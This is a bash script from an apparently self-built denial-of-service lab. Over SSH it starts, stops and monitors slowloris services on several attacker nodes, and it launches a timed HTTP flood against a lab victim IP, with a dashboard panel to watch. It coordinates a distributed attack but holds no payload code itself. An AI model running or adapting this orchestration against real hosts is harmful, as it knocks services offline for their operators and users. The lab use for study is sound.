#!/usr/bin/env bash
# =============================================================================
#  Drive the attack across every attacker node at once.
#
#      ./scripts/attack.sh start              # start slowloris everywhere
#      ./scripts/attack.sh start --duration 60  # ...and stop it again after 60s
#      ./scripts/attack.sh stop               # stop everywhere
#      ./scripts/attack.sh status             # is it running?
#      ./scripts/attack.sh logs               # last 40 journal lines per node
#      ./scripts/attack.sh flood --duration 30  # volumetric contrast (http_flood.py)
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

require_jq
require_ssh

usage() {
  cat >&2 <<'EOF'
usage: attack.sh <command> [options]

commands:
  start   [--duration SECONDS]   start slowloris on every attacker
  stop                           stop slowloris on every attacker
  restart                        stop then start
  status                         report lab-slowloris state per attacker
  logs                           tail the slowloris journal per attacker
  flood   [--duration SECONDS] [--workers N]
                                 run the volumetric http_flood.py for contrast

options:
  --duration SECONDS   stop the attack after N seconds (0 = run until stopped)
  --workers N          thread count for `flood` (default 50)
EOF
}

parse_duration() {
  DURATION=0
  WORKERS=50
  while [ $# -gt 0 ]; do
    case "$1" in
      --duration) DURATION="${2:-0}"; shift 2 ;;
      --workers)  WORKERS="${2:-50}"; shift 2 ;;
      *) die "unknown option: $1" ;;
    esac
  done
}

attacker_list() {
  mapfile -t ATTACKERS < <(attacker_ips)
  [ "${#ATTACKERS[@]}" -gt 0 ] || die "no attacker nodes found -- has the lab been applied?"
}

do_start() {
  parse_duration "$@"
  attacker_list
  log "starting slowloris on ${#ATTACKERS[@]} attacker(s)"
  for ip in "${ATTACKERS[@]}"; do
    if remote "$ip" "sudo systemctl start lab-slowloris"; then
      ok "started on $ip"
    else
      warn "failed to start on $ip"
    fi
  done

  if [ "$DURATION" -gt 0 ]; then
    log "attack will stop automatically in ${DURATION}s"
    sleep "$DURATION"
    do_stop
  fi

  log "the attack is running -- ./scripts/attack.sh stop when you are done"
}

do_stop() {
  attacker_list
  log "stopping slowloris on ${#ATTACKERS[@]} attacker(s)"
  for ip in "${ATTACKERS[@]}"; do
    if remote "$ip" "sudo systemctl stop lab-slowloris"; then
      ok "stopped on $ip"
    else
      warn "failed to stop on $ip"
    fi
  done
  log "sockets are closed; the victim needs a moment to reap the half-open connections"
}

do_status() {
  attacker_list
  for ip in "${ATTACKERS[@]}"; do
    local state
    state="$(remote "$ip" "systemctl is-active lab-slowloris" 2>/dev/null || true)"
    printf '%-16s %s\n' "$ip" "${state:-unknown}"
  done
}

do_logs() {
  attacker_list
  for ip in "${ATTACKERS[@]}"; do
    echo >&2
    log "journal for lab-slowloris on $ip"
    remote "$ip" "sudo journalctl -u lab-slowloris -n 40 --no-pager" || warn "no journal on $ip"
  done
}

do_flood() {
  parse_duration "$@"
  [ "$DURATION" -gt 0 ] || DURATION=30
  local target
  target="$(tf_raw victim_private_ip)"
  attacker_list

  log "starting http_flood.py on ${#ATTACKERS[@]} attacker(s) -> $target (${DURATION}s, ${WORKERS} workers each)"
  for ip in "${ATTACKERS[@]}"; do
    remote "$ip" "sudo nohup python3 /opt/lab/attack/http_flood.py \
        --target $target --port 80 --workers $WORKERS --duration $DURATION \
        --i-have-permission > /tmp/http_flood.log 2>&1 &" && ok "flooding from $ip"
  done

  log "running; logs land in /tmp/http_flood.log on each attacker"
  log "watch the 'Victim network throughput' panel -- unlike slowloris, this one moves"
}

command="${1:-}"
[ $# -gt 0 ] && shift || true

case "$command" in
  start)   do_start "$@" ;;
  stop)    do_stop "$@" ;;
  restart) do_stop; sleep 2; do_start "$@" ;;
  status)  do_status "$@" ;;
  logs)    do_logs "$@" ;;
  flood)   do_flood "$@" ;;
  ""|-h|--help|help) usage; exit 0 ;;
  *) usage; die "unknown command: $command" ;;
esac
